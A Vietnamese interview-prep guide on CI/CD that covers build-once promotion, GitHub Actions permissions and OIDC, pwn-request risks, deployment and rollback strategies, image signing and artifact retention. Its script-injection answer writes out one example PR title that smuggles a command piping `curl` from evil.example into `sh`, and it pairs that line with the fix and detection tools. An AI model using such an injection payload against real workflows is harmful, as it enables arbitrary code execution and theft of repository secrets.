# Câu hỏi phỏng vấn: CI/CD và artifact

## Continuous integration, continuous delivery và continuous deployment khác nhau thế nào?

- **Continuous integration**: mọi người merge vào nhánh chính ít nhất mỗi ngày, mỗi lần merge được build và test tự động, nhánh
  chính luôn xanh. Đo bằng độ dài sống của nhánh và thời gian sửa khi nhánh chính đỏ.
- **Continuous delivery**: mọi commit xanh trên nhánh chính đều **có thể** lên production bằng một thao tác, vì artifact đã được
  build, kiểm và sẵn sàng; việc lên hay không là quyết định kinh doanh.
- **Continuous deployment**: mọi commit xanh **tự động** lên production, không người duyệt; an toàn nhờ gate tự động (canary
  analysis, smoke test) và rollback tự động.

Phần lớn tổ chức làm continuous delivery cho production và continuous deployment cho staging. Thứ quan trọng hơn tên gọi là bốn
chỉ số DORA: tần suất deploy, lead time từ commit tới production, change failure rate, thời gian khôi phục.

## "Build một lần, promote nhiều lần" nghĩa là gì và vì sao quan trọng?

Image được build đúng một lần ở CI, định danh bằng digest; mọi môi trường sau nhận **cùng digest**, chỉ khác cấu hình (biến môi
trường, Secret, số replica). Promotion là ghi digest vào cấu hình của môi trường tiếp theo hay gắn thêm tag cho cùng manifest
(`imagetools create`, `crane tag`), không build lại.

Build lại cho từng môi trường tạo ra artifact chưa ai kiểm: image nền có thể vừa được build lại, gói trên PyPI có bản mới, timestamp
trong layer khác. Staging xanh không còn chứng minh gì cho production. Hệ quả kéo theo: cấu hình phải tách khỏi image (12-factor),
và image không được chứa thứ riêng của môi trường.

## Workflow GitHub Actions của bạn cần đẩy image lên registry và deploy lên cloud. Bạn cấp quyền thế nào?

1. `permissions: contents: read` ở cấp workflow; job build nâng `packages: write` (GHCR), job ký và deploy nâng `id-token: write`.
   Job chạy test không bao giờ có quyền ghi.
2. Đẩy GHCR bằng `GITHUB_TOKEN` ngắn hạn, không PAT.
3. Deploy cloud bằng **OIDC**: job xin ID token của GitHub, cloud đổi nó lấy credential tạm theo trust policy khớp claim `sub`
   (`repo:olist/olist-shop:environment:production`). Không có khoá dài hạn nào để lộ hay xoay vòng.
4. Job deploy production gắn `environment: production` có required reviewers và giới hạn nhánh; secret còn lại (dịch vụ không hỗ
   trợ OIDC) đặt ở environment, không ở repo.
5. Action bên thứ ba ghim SHA, `persist-credentials: false` cho checkout.

## `pull_request` và `pull_request_target` khác nhau thế nào? Khi nào `pull_request_target` nguy hiểm?

`pull_request` chạy workflow **từ commit của PR**; PR từ fork nhận token chỉ đọc và không có secret. `pull_request_target` chạy
workflow **của nhánh đích** với token và secret của repo gốc, kể cả PR từ fork, vì GitHub coi workflow đó là đáng tin.

Nguy hiểm khi workflow `pull_request_target` checkout hay chạy code của PR (`ref: ${{ github.event.pull_request.head.sha }}`, `git
fetch pull/N/head`, `npm install` trên `package.json` của PR): người lạ chạy code tuỳ ý với quyền ghi repo và secret ("pwn
request"). Dùng `pull_request_target` chỉ cho việc không đụng code của PR (gắn nhãn, bình luận chào), hoặc tách hai workflow: một
`pull_request` không quyền build và upload kết quả, một `workflow_run` có quyền đọc kết quả đó như dữ liệu.

## Script injection trong GitHub Actions là gì? Sửa thế nào?

Biểu thức `${{ }}` được thay vào **văn bản** của script trước khi shell chạy. `run: echo "${{ github.event.pull_request.title }}"`
với tiêu đề `x"; curl -sSf https://evil.example/p | sh; echo "` trở thành ba lệnh. Mọi trường người ngoài đặt được đều nguy hiểm:
tiêu đề và nội dung PR, issue, comment, tên nhánh (`github.head_ref`), commit message, tên tác giả.

Sửa: đưa giá trị qua `env:` (`env: TITLE: ${{ github.event.pull_request.title }}`, `run: printf '%s\n' "$TITLE"`) để shell coi là
dữ liệu; hoặc dùng `actions/github-script` truyền qua input. Phát hiện bằng actionlint (kiểm "untrusted input"), zizmor, CodeQL
cho workflow. Giảm thiệt hại bằng `permissions` tối thiểu.

## (Sự cố) Tuần trước image `olist-api:latest` trên production chạy code của một nhánh tính năng chưa review. Bạn điều tra và sửa thế nào?

1. Xác định bản đang chạy: `kubectl get pod -o jsonpath='{..imageID}'` cho digest thật của từng pod; tra digest đó trên registry:
   ai đẩy, lúc nào, từ workflow nào (log kiểm toán của registry, lịch sử run).
2. Thường gặp: workflow trigger `push` trên **mọi nhánh** và luôn đẩy `:latest`; manifest production tham chiếu `:latest` với
   `imagePullPolicy: Always`. Push lên nhánh tính năng dời `latest`, pod nào khởi động lại sau đó (scale, node mới, crash) kéo bản
   của nhánh. Pod khác vẫn chạy bản cũ: production chạy hai phiên bản mà không ai deploy.
3. Khôi phục: deploy lại digest của bản production trước đó (lấy từ lịch sử deploy hay ReplicaSet cũ), không phải "đẩy lại latest".
4. Sửa gốc: trigger `push` chỉ trên `main`; tag bất biến `sha-<12>`; manifest tham chiếu digest; bỏ `latest` khỏi pipeline hoặc chỉ
   cho kênh thử nghiệm; bật tag immutability trên registry; admission policy từ chối image không theo digest.
5. Postmortem: vì sao không ai thấy (không có lịch sử deploy theo digest, không cảnh báo khi pod chạy digest khác nhau).

## Bạn chọn chiến lược deploy nào cho API thanh toán, worker xử lý hàng đợi, và một tính năng mới cần ra mắt đúng ngày?

- **API thanh toán**: canary có phân tích tự động (5%, 25%, 50%), ngưỡng viết trước, so với baseline: tỉ lệ 5xx, p95, tỉ lệ thanh
  toán thành công. Vượt ngưỡng thì dồn traffic về bản cũ trong vài giây. Nếu thay đổi không cho phép hai bản cùng chạy (đổi giao
  thức) thì blue/green.
- **Worker**: phụ thuộc tính chất. Worker idempotent tiêu thụ hàng đợi thì rolling là đủ (cần dừng êm khi nhận SIGTERM để không mất
  message). Worker giữ khoá độc quyền hay ghi kết quả toàn cục thì recreate, hoặc sửa thành dùng lease.
- **Tính năng ra mắt đúng ngày**: feature flag. Code đi theo các lần deploy thường ngày nhưng tắt; ngày ra mắt bật theo vùng hay tỉ
  lệ; rollback là tắt flag. Flag có chủ và hạn xoá.

## Làm sao rollback khi bản mới đã chạy migration cơ sở dữ liệu?

Rollback code chỉ an toàn khi bản cũ chạy được trên schema mới. Vì vậy migration phải **tương thích ngược** và theo
**expand/contract**: thêm cột hay bảng mới (expand), code ghi cả hai, backfill, chuyển chỗ đọc ở release sau, xoá cái cũ (contract)
ở release sau nữa khi chắc không quay lại. Migration chạy như job riêng trước deploy code, CI chạy test của bản đang ở production
trên schema mới.

Khi migration không đảo được (xoá cột, đổi kiểu mất dữ liệu): không rollback mà **roll forward**, có backup và kế hoạch sẵn. Đổi
tên cột trong một release cùng code là cách chắc chắn làm bản cũ lỗi giữa lúc rolling update.

## Cache và artifact trong CI khác nhau thế nào? Thiết kế key cho cache dependency ra sao?

Cache là thứ **có thể mất** để tăng tốc (thư mục tải của trình quản lý gói, cache của BuildKit), khôi phục theo key giữa các lần
chạy. Artifact là **kết quả** của một lần chạy (báo cáo test, binary) gắn với lần chạy đó, có hạn giữ. Image phát hành không phải
artifact của CI mà nằm trong registry.

Key của cache phải đổi khi đầu vào đổi: `${{ runner.os }}-uv-${{ hashFiles('uv.lock') }}`, kèm phiên bản công cụ nếu định dạng
cache phụ thuộc nó. `restore-keys` (tiền tố) cho phép khôi phục cache gần đúng rồi cập nhật. Cache thư mục **tải về** chứ không
cache môi trường đã cài (`.venv`, `node_modules`) giữa các phiên bản lock khác nhau; bước cài vẫn chạy và trình quản lý gói xác
nhận đúng phiên bản. Không bao giờ cache thứ chứa bí mật; cache của PR không được ghi đè cache của nhánh chính.

## (Vì sao chọn công cụ này) Vì sao bạn chọn GitHub Actions thay vì Jenkins cho một team mới? Khi nào bạn vẫn chọn Jenkins?

GitHub Actions khi code đã ở GitHub: không có controller để vận hành, runner sống một job (không trạng thái rò rỉ giữa các build),
OIDC và environment có sẵn, cấu hình trong repo được review qua PR, hệ sinh thái action lớn. Cái giá: phụ thuộc GitHub (lock-in),
phút runner tính tiền cho repo private, action bên thứ ba là rủi ro chuỗi cung ứng nên phải ghim SHA và review.

Jenkins vẫn hợp khi: môi trường đóng không ra Internet, phải chạy trên hạ tầng có sẵn (máy build đặc thù, phần cứng nhúng, Windows
cũ), có đầu tư lớn vào shared library và plugin mà chi phí chuyển đổi vượt lợi ích, hoặc cần điều phối pipeline xuyên nhiều hệ
thống. Khi chọn Jenkins: controller không chạy build, agent tạm thời (Kubernetes plugin), Configuration as Code (JCasC), ít plugin
nhất có thể và có lịch nâng cấp.

## Ký image và SBOM giải quyết vấn đề gì? Bạn đưa vào pipeline thế nào?

SBOM trả lời "image này chứa gì": khi CVE mới công bố, truy vấn SBOM ra ngay image nào bị ảnh hưởng. Chữ ký trả lời "image này có
đúng do pipeline của chúng ta build không": registry bị chiếm hay ai đó đẩy image tay thì chữ ký không khớp. Provenance (SLSA) trả
lời "build từ commit nào, bằng workflow nào".

Trong pipeline: build sinh SBOM (`--sbom=true` hay syft) và provenance (`actions/attest-build-provenance`, `--provenance=mode=max`);
cosign keyless ký **digest** bằng token OIDC của job (`id-token: write`); chữ ký và attestation lưu cạnh image trên registry. Kiểm
ở nơi chạy: admission controller (Kyverno `verifyImages`, Sigstore policy-controller) chỉ nhận image được ký bởi đúng workflow
(`certificate-identity` là đường dẫn workflow, issuer là `token.actions.githubusercontent.com`). Ký mà không kiểm là vô ích.

## Bạn thử một workflow GitHub Actions trên máy thế nào? Giới hạn của cách đó là gì?

`act` chạy job trong container Docker theo đồ thị `needs:`: bước `run:`, `outputs`, `if:`, matrix, action JavaScript và composite
chạy thật. Không có: environment, phê duyệt, OIDC, `concurrency`, dịch vụ cache và artifact của GitHub (act có server giả lập tuỳ
chọn), runner khác Linux. Image runner nhỏ (`node:*-slim`) thiếu nhiều công cụ của runner thật.

Bảo mật: mặc định act mount socket Docker vào job, tức là cho mọi bước quyền root trên máy; tắt bằng `--container-daemon-socket -`.
Bước cần nền tảng thật (login registry, deploy) gắn `if: ${{ !env.ACT }}` để bị bỏ qua dưới act. Cách bền hơn: giữ logic trong
script chạy được ở mọi nơi (test bằng shell, bats, pytest), workflow chỉ là lớp mỏng gọi script; kiểm tĩnh workflow bằng actionlint,
zizmor trong pre-commit và CI.

## (Thiết kế) Thiết kế CI/CD cho monorepo 30 service Python và Node.js, 50 kỹ sư, deploy nhiều lần mỗi ngày.

- **Chỉ build thứ bị đổi**: đồ thị phụ thuộc (Bazel, Nx, Pants, hay `paths-filter` cộng manifest phụ thuộc tự viết); matrix động
  theo danh sách service bị ảnh hưởng. PR dưới 10 phút ở trường hợp thường.
- **Chuẩn hoá bằng reusable workflow** của platform team: build, test, quét, SBOM, ký giống nhau cho mọi service; service chỉ khai
  báo tham số. CODEOWNERS cho `.github/`.
- **Artifact**: mỗi service một repository image, tag `sha-<12>`, promote theo digest; gói nội bộ lên Nexus hay Artifactory có proxy
  cache để build không phụ thuộc Internet công cộng.
- **CD tách khỏi CI**: CI ghi digest mới vào repo GitOps (PR tự động cho production); Argo CD hay Flux áp vào cluster. CI không cầm
  credential của cluster.
- **Deploy**: canary tự động cho service nhiều traffic, rolling cho phần còn lại, feature flag cho tính năng; merge queue để nhánh
  chính luôn xanh khi 50 người merge.
- **Đo**: thời gian pipeline p50/p95 theo service, tỉ lệ flaky test (cách ly test flaky tự động), DORA theo service, chi phí runner.
- **Rủi ro**: pipeline thành nút cổ chai của platform team (cho team tự mở rộng qua input của reusable workflow), runner tự host
  phải sống một job.

## Chính sách giữ lại artifact của bạn là gì?

Giữ mọi tag phát hành vô thời hạn (hay theo yêu cầu kiểm toán); giữ mọi digest đang chạy ở bất kỳ môi trường nào (lấy từ cluster
hay repo GitOps) cộng N bản gần nhất của nhánh chính để rollback; xoá image của PR sau 14 ngày; xoá image không tag sau 7 ngày;
chạy garbage collection của registry sau khi xoá manifest. Artifact của CI (báo cáo, coverage) 7 tới 30 ngày. Chính sách viết ra và
tự động (lifecycle policy của ECR, cleanup policy của Nexus, retention của Harbor), có cảnh báo trước khi xoá thứ đang được tham
chiếu. Quên dọn thì registry phình và chi phí lưu trữ tăng âm thầm; dọn quá tay thì mất đường rollback.
